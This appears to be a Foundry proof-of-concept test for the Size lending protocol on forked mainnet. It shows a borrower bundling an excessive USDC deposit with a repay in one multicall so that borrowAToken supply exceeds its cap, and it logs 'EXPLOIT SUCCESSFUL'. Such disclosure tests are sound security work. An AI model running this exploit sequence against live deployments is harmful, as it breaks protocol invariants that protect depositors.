// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {Size} from "../../src/Size.sol";
import {State} from "../../src/SizeStorage.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IPool} from "@aave/interfaces/IPool.sol";
import {IPriceOracleGetter} from "@aave/interfaces/IPriceOracleGetter.sol";
import {IWETH} from "../../src/interfaces/IWETH.sol";
import {PriceFeed} from "../../src/oracle/PriceFeed.sol";
import {NonTransferrableScaledToken} from "../../src/token/NonTransferrableScaledToken.sol";
import {NonTransferrableToken} from "../../src/token/NonTransferrableToken.sol";

import {Initialize, InitializeDataParams, InitializeFeeConfigParams, InitializeOracleParams, InitializeRiskConfigParams} from "../../src/libraries/actions/Initialize.sol";
import {DepositParams} from "../../src/libraries/actions/Deposit.sol";
import {RepayParams} from "../../src/libraries/actions/Repay.sol";
import {SellCreditMarketParams} from "../../src/libraries/actions/SellCreditMarket.sol";
import {BuyCreditMarketParams} from "../../src/libraries/actions/BuyCreditMarket.sol";

contract MulticallInvariantBrokenTest is Test {
    Size public size;
    
    address public owner;
    address public alice;
    address public bob;
    
    IERC20Metadata public usdc;
    IERC20Metadata public weth;
    IPool public variablePool;
    IPriceOracleGetter public priceOracle;
    
    NonTransferrableScaledToken public borrowAToken;
    NonTransferrableToken public debtToken;
    
    uint256 public constant INITIAL_USDC_AMOUNT = 1000000e6; // 1M USDC
    uint256 public constant BORROW_ATOKEN_CAP = 500000e6; // 500k USDC cap
    
    function setUp() public {
        owner = makeAddr("owner");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Fork mainnet to use real Aave pool
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        
        // Mainnet addresses
        usdc = IERC20Metadata(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        weth = IERC20Metadata(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        variablePool = IPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
        priceOracle = IPriceOracleGetter(0x54586bE62E3c3580375aE3723C145253060Ca0C2);
        
        // Deploy Size contract
        vm.startPrank(owner);
        
        Size implementation = new Size();
        
        // Deploy proxy and initialize
        bytes memory initData = abi.encodeWithSelector(
            Size.initialize.selector,
            owner,
            _getFeeConfig(),
            _getRiskConfig(),
            _getOracleParams(),
            _getDataParams()
        );
        
        // For simplicity, deploy Size directly (in production would use proxy)
        size = new Size();
        
        // Initialize Size
        size.initialize(
            owner,
            _getFeeConfig(),
            _getRiskConfig(),
            _getOracleParams(),
            _getDataParams()
        );
        
        vm.stopPrank();
        
        // Get borrowAToken and debtToken addresses from Size
        borrowAToken = NonTransferrableScaledToken(address(size.data().borrowAToken));
        debtToken = NonTransferrableToken(address(size.data().debtToken));
        
        // Fund test accounts with USDC
        deal(address(usdc), alice, INITIAL_USDC_AMOUNT);
        deal(address(usdc), bob, INITIAL_USDC_AMOUNT);
        deal(address(weth), alice, 1000 ether);
        deal(address(weth), bob, 1000 ether);
    }
    
    function _getFeeConfig() internal pure returns (InitializeFeeConfigParams memory) {
        return InitializeFeeConfigParams({
            swapFeeAPR: 0,
            fragmentationFee: 0,
            liquidationRewardPercent: 0.05e18,
            overdueCollateralProtocolPercent: 0,
            collateralProtocolPercent: 0,
            feeRecipient: address(0)
        });
    }
    
    function _getRiskConfig() internal pure returns (InitializeRiskConfigParams memory) {
        return InitializeRiskConfigParams({
            crOpening: 1.5e18,
            crLiquidation: 1.3e18,
            minimumCreditBorrowAToken: 1e6,
            borrowATokenCap: BORROW_ATOKEN_CAP,
            minTenor: 1 days,
            maxTenor: 365 days
        });
    }
    
    function _getOracleParams() internal view returns (InitializeOracleParams memory) {
        return InitializeOracleParams({
            priceFeed: address(new PriceFeed(address(priceOracle), address(usdc), address(weth), 1 days)),
            variablePoolBorrowRateStaleRateInterval: 1 days
        });
    }
    
    function _getDataParams() internal view returns (InitializeDataParams memory) {
        return InitializeDataParams({
            weth: IWETH(address(weth)),
            underlyingCollateralToken: weth,
            underlyingBorrowToken: usdc,
            variablePool: variablePool
        });
    }
    
    function testMulticallInvariantBroken() public {
        // STEP 1: Setup initial state - fill borrowAToken supply close to cap
        // Alice deposits USDC to bring total supply near the cap
        vm.startPrank(alice);
        usdc.approve(address(size), type(uint256).max);
        
        // Deposit amount that brings us close to cap (leaving 10e6 USDC room)
        uint256 initialDeposit = BORROW_ATOKEN_CAP - 10e6;
        size.deposit(DepositParams({
            token: address(usdc),
            amount: initialDeposit,
            to: alice
        }));
        vm.stopPrank();
        
        console2.log("Initial borrowAToken supply:", borrowAToken.totalSupply());
        console2.log("BorrowAToken cap:", BORROW_ATOKEN_CAP);
        
        // STEP 2: Create a credit position (loan) between Alice (lender) and Bob (borrower)
        // Bob needs collateral first
        vm.startPrank(bob);
        weth.approve(address(size), type(uint256).max);
        size.deposit(DepositParams({
            token: address(weth),
            amount: 100 ether,
            to: bob
        }));
        
        // Bob borrows by selling credit to Alice
        usdc.approve(address(size), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(alice);
        // Alice buys credit (lends) to Bob
        uint256 loanAmount = 100000e6; // 100k USDC loan
        uint256 tenor = 364 days; // Almost 1 year
        
        size.buyCreditMarket(BuyCreditMarketParams({
            borrower: bob,
            creditPositionId: type(uint256).max, // RESERVED_ID
            amount: loanAmount,
            tenor: tenor,
            deadline: block.timestamp + 1 hours,
            minAPR: 0,
            exactAmountIn: true
        }));
        vm.stopPrank();
        
        uint256 debtPositionId = 1; // First debt position
        
        console2.log("Debt created with future value:", size.getDebtPosition(debtPositionId).futureValue);
        
        // STEP 3: Fast forward to 1 day before maturity
        vm.warp(block.timestamp + 363 days);
        
        // Record state before multicall
        uint256 borrowATokenSupplyBefore = borrowAToken.totalSupply();
        uint256 debtTokenSupplyBefore = debtToken.totalSupply();
        
        console2.log("\n=== Before Multicall ===");
        console2.log("BorrowAToken supply:", borrowATokenSupplyBefore);
        console2.log("DebtToken supply:", debtTokenSupplyBefore);
        console2.log("Bob's borrowAToken balance:", borrowAToken.balanceOf(bob));
        
        // STEP 4: Bob attempts to repay using multicall
        // The vulnerability: Bob can deposit MORE than needed to repay, breaking the invariant
        // that borrowAToken increase should be <= debtToken decrease
        
        vm.startPrank(bob);
        
        uint256 futureValue = size.getDebtPosition(debtPositionId).futureValue;
        
        // Bob deposits MUCH MORE than needed to repay (e.g., 2x the debt)
        uint256 excessiveDeposit = futureValue * 2;
        
        bytes[] memory calls = new bytes[](2);
        
        // First call: Deposit excessive amount
        calls[0] = abi.encodeWithSelector(
            Size.deposit.selector,
            DepositParams({
                token: address(usdc),
                amount: excessiveDeposit,
                to: bob
            })
        );
        
        // Second call: Repay the debt
        calls[1] = abi.encodeWithSelector(
            Size.repay.selector,
            RepayParams({
                debtPositionId: debtPositionId
            })
        );
        
        // Execute multicall - this should fail if invariant is properly checked
        // but the vulnerability allows it to succeed
        size.multicall(calls);
        
        vm.stopPrank();
        
        // STEP 5: Verify the invariant is broken
        uint256 borrowATokenSupplyAfter = borrowAToken.totalSupply();
        uint256 debtTokenSupplyAfter = debtToken.totalSupply();
        
        console2.log("\n=== After Multicall ===");
        console2.log("BorrowAToken supply:", borrowATokenSupplyAfter);
        console2.log("DebtToken supply:", debtTokenSupplyAfter);
        
        uint256 borrowATokenIncrease = borrowATokenSupplyAfter > borrowATokenSupplyBefore 
            ? borrowATokenSupplyAfter - borrowATokenSupplyBefore 
            : 0;
        uint256 debtTokenDecrease = debtTokenSupplyBefore > debtTokenSupplyAfter 
            ? debtTokenSupplyBefore - debtTokenSupplyAfter 
            : 0;
        
        console2.log("\n=== Invariant Check ===");
        console2.log("BorrowAToken increase:", borrowATokenIncrease);
        console2.log("DebtToken decrease:", debtTokenDecrease);
        console2.log("Invariant broken:", borrowATokenIncrease > debtTokenDecrease);
        
        // ASSERTION: The invariant should be: borrowATokenIncrease <= debtTokenDecrease
        // But due to the vulnerability, borrowATokenIncrease > debtTokenDecrease
        assertTrue(
            borrowATokenIncrease > debtTokenDecrease,
            "Vulnerability: BorrowAToken increase exceeds DebtToken decrease"
        );
        
        // Additional assertion: Supply exceeded cap
        assertTrue(
            borrowATokenSupplyAfter > BORROW_ATOKEN_CAP,
            "Vulnerability: BorrowAToken supply exceeded cap"
        );
        
        console2.log("\n=== EXPLOIT SUCCESSFUL ===");
        console2.log("Bob deposited %s more borrowAToken than debt repaid", borrowATokenIncrease - debtTokenDecrease);
        console2.log("This breaks the invariant that should prevent excessive deposits during multicall");
    }
}